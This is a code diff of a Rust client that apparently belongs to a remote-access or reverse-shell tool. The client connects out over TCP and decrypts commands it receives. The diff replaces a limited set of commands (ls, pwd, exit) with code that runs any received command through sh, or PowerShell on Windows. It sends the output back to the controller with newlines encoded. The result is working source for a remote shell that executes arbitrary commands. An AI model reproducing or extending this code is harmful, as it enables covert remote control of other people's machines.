@@ -1,10 +1,11 @@
-use std::env;
 use std::io::prelude::*;
 use std::net::{TcpStream, Shutdown};
 use std::io::BufReader;
 use std::process::exit;
 
-use super::{utils, crypt, dir};
+use std::process::Command;
+
+use super::{utils, crypt};
 
 pub struct Sock {
     pub stream: TcpStream,
@@ -95,56 +96,31 @@ impl Sock {
             let sent_nonce = values[1].to_owned();
             
             let decrypted =  crypt::decrypt(&encrypted, &self.key, &sent_nonce);
-
-            println!("Command: {}", decrypted);
-
-            self.manage_command(decrypted);
+            
+            self.manage_command(&decrypted);
         }
     }
 
-    fn manage_command(&mut self, cmd: String) {
-        let split: Vec<&str> = cmd.split(":").collect();
-    
-        // Check if we have a valid command format
-        if split.len() != 2 {
-            println!("[-] Received command is invalid");
-            self.send(&"Invalid command".to_owned(), &utils::random_nonce());
-            return
+    fn manage_command(&mut self, cmd: &str) {
+        let command = &cmd.replace("\x08", "");
+
+        let mut shell = "sh";
+        if cfg!(windows) {
+            shell = "powershell";
         }
 
-        // Separate values and remoce encryption padding
-        let command = split[0];
-        let value = &split[1].replace("\x08", "");
+        let output = Command::new(shell).args(&["-c", command]).output().unwrap();
 
-        // Handle all commands
-        match command {
-            "ls"              => self.get_directories(value),
-            "pwd"             => self.get_path(),
-            "DecryptionError" => self.send(&"Decryption Failed".to_owned(), &utils::random_nonce()),
-            "exit"            => { println!("[+] Connection ended"); exit(0); },
-            _                 => self.send(&"Invalid Command".to_owned(), &utils::random_nonce())
-        }
-    }
+        let mut out: String = std::str::from_utf8(output.stdout.as_slice()).unwrap().to_owned();
 
-    fn get_directories(&mut self, path: &str) {
-        let directories = &dir::files_in_path(path);
-        self.send(directories, &utils::random_nonce());
-    }
-    
-    fn get_path(&mut self) {
-        // Get our current path
-        let path = env::current_dir();
-
-        // Check if there are any errors
-        match path {
-            Ok(_) => (),
-            Err(_) => {println!("[-] Error while getting path"); return}
+        if out == "" {
+            out = std::str::from_utf8(output.stderr.as_slice()).unwrap().to_owned();
         }
 
-        // Send the path
-        self.send(&path.unwrap().to_string_lossy().to_string(), &utils::random_nonce());
-    }
+        out = out.replace("\n", "2937846nd726345dnh");
 
+        self.send(&out, &utils::random_nonce())
+    }
 }
 
 pub fn connect(ip: &String, port: &String) -> TcpStream {
